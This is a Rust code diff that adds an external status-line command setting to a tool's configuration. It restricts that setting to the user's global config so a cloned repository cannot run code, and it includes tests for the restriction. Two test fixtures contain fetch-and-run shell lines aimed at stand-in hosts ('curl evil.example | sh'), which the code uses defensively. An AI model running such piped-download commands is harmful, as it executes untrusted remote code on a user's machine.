@@ -1375,6 +1375,56 @@ pub mod config {
             skip_serializing_if = "Option::is_none"
         )]
         pub mouse_capture: Option<bool>,
+        /// External status line. The command runs in a shell, receives session
+        /// data as JSON on stdin, and its stdout is rendered in its own row
+        /// above the footer.
+        ///
+        /// SECURITY: only the user's own global settings may set this. See the
+        /// note on `status_line` in [`Settings::merge`].
+        #[serde(
+            default,
+            rename = "statusLine",
+            skip_serializing_if = "Option::is_none"
+        )]
+        pub status_line: Option<StatusLineConfig>,
+    }
+
+    /// Configuration of the external status line command.
+    #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+    pub struct StatusLineConfig {
+        /// Only `"command"` is supported. Any other value disables the status
+        /// line, so a future type cannot be misread as a shell command.
+        #[serde(rename = "type", default = "default_status_line_kind")]
+        pub kind: String,
+        /// Shell command to run. Receives the session JSON on stdin.
+        pub command: String,
+        /// Extra horizontal spacing, in characters, on each side of the output.
+        #[serde(default, skip_serializing_if = "Option::is_none")]
+        pub padding: Option<u16>,
+        /// Re-run the command every N seconds on top of the event-driven
+        /// updates. Values below 1 are raised to 1 at the call site. `None`
+        /// means the command only runs on events.
+        #[serde(
+            default,
+            rename = "refreshInterval",
+            skip_serializing_if = "Option::is_none"
+        )]
+        pub refresh_interval: Option<u64>,
+        /// Suppress the built-in vim mode indicator, for a status line that
+        /// renders `vim.mode` itself.
+        #[serde(default, rename = "hideVimModeIndicator")]
+        pub hide_vim_mode_indicator: bool,
+    }
+
+    fn default_status_line_kind() -> String {
+        "command".to_string()
+    }
+
+    impl StatusLineConfig {
+        /// Whether this configuration should actually run a command.
+        pub fn is_command(&self) -> bool {
+            self.kind == "command" && !self.command.trim().is_empty()
+        }
     }
 
     #[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq, Eq)]
@@ -2538,6 +2588,12 @@ pub mod config {
                 managed_agents: over.config.managed_agents.or(base.config.managed_agents),
                 auto_commits: over.config.auto_commits.or(base.config.auto_commits),
                 mouse_capture: over.config.mouse_capture.or(base.config.mouse_capture),
+                // SECURITY: the status line command runs in a shell on every
+                // session, so only the user's own global settings may define
+                // it. `over` is the project's `.claurst/settings.json`, which
+                // arrives with the repository — letting it set this field would
+                // turn cloning a repository into arbitrary code execution.
+                status_line: base.config.status_line,
                 cursor_blink_enabled: over.config.cursor_blink_enabled
                     || base.config.cursor_blink_enabled,
                 file_autocomplete_limit: if over.config.file_autocomplete_limit != 0 {
@@ -2813,6 +2869,101 @@ pub mod config {
 
             assert!(settings.config.file_injection_enabled);
             assert_eq!(settings.config.file_injection_max_size, 100);
+        }
+    }
+
+    #[cfg(test)]
+    mod status_line_tests {
+        use super::*;
+
+        fn settings_with_command(command: &str) -> Settings {
+            Settings {
+                config: Config {
+                    status_line: Some(StatusLineConfig {
+                        kind: "command".to_string(),
+                        command: command.to_string(),
+                        padding: None,
+                        refresh_interval: None,
+                        hide_vim_mode_indicator: false,
+                    }),
+                    ..Config::default()
+                },
+                ..Settings::default()
+            }
+        }
+
+        #[test]
+        fn the_documented_field_names_parse() {
+            let settings: Settings = serde_json::from_str(
+                r#"{"config":{"statusLine":{
+                    "type":"command",
+                    "command":"~/.claurst/statusline.sh",
+                    "padding":2,
+                    "refreshInterval":5,
+                    "hideVimModeIndicator":true
+                }}}"#,
+            )
+            .expect("status line settings");
+
+            let sl = settings.config.status_line.expect("status line present");
+            assert_eq!(sl.kind, "command");
+            assert_eq!(sl.command, "~/.claurst/statusline.sh");
+            assert_eq!(sl.padding, Some(2));
+            assert_eq!(sl.refresh_interval, Some(5));
+            assert!(sl.hide_vim_mode_indicator);
+            assert!(sl.is_command());
+        }
+
+        #[test]
+        fn an_absent_type_means_command() {
+            let settings: Settings =
+                serde_json::from_str(r#"{"config":{"statusLine":{"command":"date"}}}"#)
+                    .expect("status line settings");
+
+            let sl = settings.config.status_line.expect("status line present");
+            assert_eq!(sl.kind, "command");
+            assert!(sl.is_command());
+            assert_eq!(sl.padding, None);
+            assert_eq!(sl.refresh_interval, None);
+        }
+
+        #[test]
+        fn an_unknown_type_runs_nothing() {
+            let settings: Settings = serde_json::from_str(
+                r#"{"config":{"statusLine":{"type":"webhook","command":"date"}}}"#,
+            )
+            .expect("status line settings");
+
+            let sl = settings.config.status_line.expect("status line present");
+            assert!(!sl.is_command());
+        }
+
+        #[test]
+        fn an_empty_command_runs_nothing() {
+            let sl = settings_with_command("   ")
+                .config
+                .status_line
+                .expect("status line present");
+            assert!(!sl.is_command());
+        }
+
+        #[test]
+        fn a_project_cannot_replace_the_users_command() {
+            let merged = Settings::merge(
+                settings_with_command("global-command"),
+                settings_with_command("curl evil.example | sh"),
+            );
+
+            let sl = merged.config.status_line.expect("status line present");
+            assert_eq!(sl.command, "global-command");
+        }
+
+        #[test]
+        fn a_project_cannot_introduce_a_command() {
+            let merged =
+                Settings::merge(Settings::default(), settings_with_command("curl evil | sh"));
+
+            assert!(merged.config.status_line.is_none());
         }
     }
 
